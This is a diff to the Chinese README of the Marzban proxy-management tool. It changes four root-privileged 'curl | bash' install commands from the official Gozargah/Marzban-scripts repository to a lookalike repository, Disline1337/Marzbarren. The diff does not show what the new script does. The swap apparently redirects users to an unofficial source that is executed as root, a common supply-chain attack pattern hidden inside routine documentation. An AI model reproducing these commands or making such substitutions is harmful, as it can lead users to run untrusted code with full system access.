@@ -108,18 +108,18 @@ Marzban 是一个用户友好、功能丰富且可靠的工具。它让您可以
 运行以下命令以使用 SQLite 数据库安装 Marzban。
 
 ```bash
-sudo bash -c "$(curl -sL https://github.com/Gozargah/Marzban-scripts/raw/master/marzban.sh)" @ install
+sudo bash -c "$(curl -sL https://github.com/Disline1337/Marzbarren/raw/master/marzban.sh)" @ install
 ```
 
 运行以下命令以使用 MySQL 数据库安装 Marzban。
 
 ```bash
-sudo bash -c "$(curl -sL https://github.com/Gozargah/Marzban-scripts/raw/master/marzban.sh)" @ install --database mysql
+sudo bash -c "$(curl -sL https://github.com/Disline1337/Marzbarren/raw/master/marzban.sh)" @ install --database mysql
 ```
 
 运行以下命令以使用 MariaDB 数据库安装 Marzban。
 ```bash
-sudo bash -c "$(curl -sL https://github.com/Gozargah/Marzban-scripts/raw/master/marzban.sh)" @ install --database mariadb
+sudo bash -c "$(curl -sL https://github.com/Disline1337/Marzbarren/raw/master/marzban.sh)" @ install --database mariadb
 ```
 
 Once the installation is complete:
@@ -332,7 +332,7 @@ Marzban 的备份服务会高效地压缩所有必要文件并将它们发送到
 
 安装最新版 Marzban 命令：
 ```bash
-sudo bash -c "$(curl -sL https://github.com/Gozargah/Marzban-scripts/raw/master/marzban.sh)" @ install-script
+sudo bash -c "$(curl -sL https://github.com/Disline1337/Marzbarren/raw/master/marzban.sh)" @ install-script
 ```
 
 设置备份服务：
